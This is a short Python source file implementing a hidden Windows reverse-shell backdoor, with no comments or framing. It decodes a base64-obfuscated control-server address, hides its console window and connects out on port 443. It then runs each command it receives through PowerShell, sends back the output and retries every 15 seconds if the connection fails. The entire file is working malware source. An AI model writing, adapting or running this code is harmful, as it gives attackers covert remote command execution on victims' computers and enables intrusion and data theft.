import ctypes
import base64
import subprocess
import time
import socket

def get_c2():
    
    return base64.b64decode("MTAuMjExLjU1LjU=").decode()

def execute_native(cmd):
   
    si = ctypes.create_string_buffer(104) 
    pi = ctypes.create_string_buffer(16)  
    
    ctypes.windll.kernel32.CreateProcessA(None, cmd.encode(), None, None, False, 0x08000000, None, None, si, pi)

def run():
    ip = get_c2()
    port = 443
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            while True:
                cmd = s.recv(1024).decode()
                if not cmd: break
               
                res = subprocess.check_output(["powershell", "-Command", cmd], stderr=subprocess.STDOUT)
                s.send(res)
        except:
            time.sleep(15)

if __name__ == "__main__":
    
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    run()
